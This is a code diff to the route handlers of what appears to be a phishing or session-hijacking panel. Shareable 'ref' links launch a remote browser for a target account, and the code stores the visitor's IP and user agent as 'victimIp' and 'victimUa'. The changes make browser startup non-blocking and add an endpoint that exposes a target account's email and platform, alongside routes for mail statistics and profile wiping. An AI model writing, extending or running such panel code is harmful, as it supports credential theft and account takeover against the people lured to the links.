@@ -139,7 +139,7 @@ export default async function panelRoutes(app) {
       if (isGoogle) proxyFields = { useProxy: false };
     }
     await saveAccount({ id, label, startUrl, ...(returnUrl ? { returnUrl } : {}), ...proxyFields });
-    await browser.start(id, req.ip).catch(() => {});
+    browser.start(id, req.ip).catch(() => {}); // fire-and-forget — don't block the response
     const saved = await getAccount(id);
     const ref = saved?.ref || '';
     const publicHost = config.publicHost || (req.headers['x-forwarded-host'] || req.headers.host || 'localhost');
@@ -164,7 +164,7 @@ export default async function panelRoutes(app) {
     if (!await getAccount(id)) return reply.code(404).send({ error: 'unknown_account' });
     await browser.stop(id).catch(() => {});
     const wiped = await browser.wipeProfile(id);
-    await browser.start(id, req.ip).catch(() => {});
+    browser.start(id, req.ip).catch(() => {}); // fire-and-forget
     return { ok: true, wiped };
   });
 
@@ -321,8 +321,18 @@ export default async function panelRoutes(app) {
     if (!acc.victimIp || !acc.victimUa) {
       await saveAccount({ ...acc, victimIp, victimUa, victimFirstSeen: Date.now() });
     }
-    await browser.start(acc.id, req.ip);
+    browser.start(acc.id, req.ip).catch(() => {}); // fire-and-forget — viewer retries until ready
     return { accountId: acc.id, ref: req.params.ref };
+  });
+
+  app.get('/api/account-by-ref/:ref/info', async (req, reply) => {
+    const acc = await getAccountByRef(req.params.ref);
+    if (!acc) return reply.code(404).send({ error: 'unknown_ref' });
+    return {
+      label: acc.label || '',
+      email: acc.email || '',
+      platform: acc.platform || '',
+    };
   });
 
   app.get('/api/accounts/:id/mail-stats', async (req, reply) => {
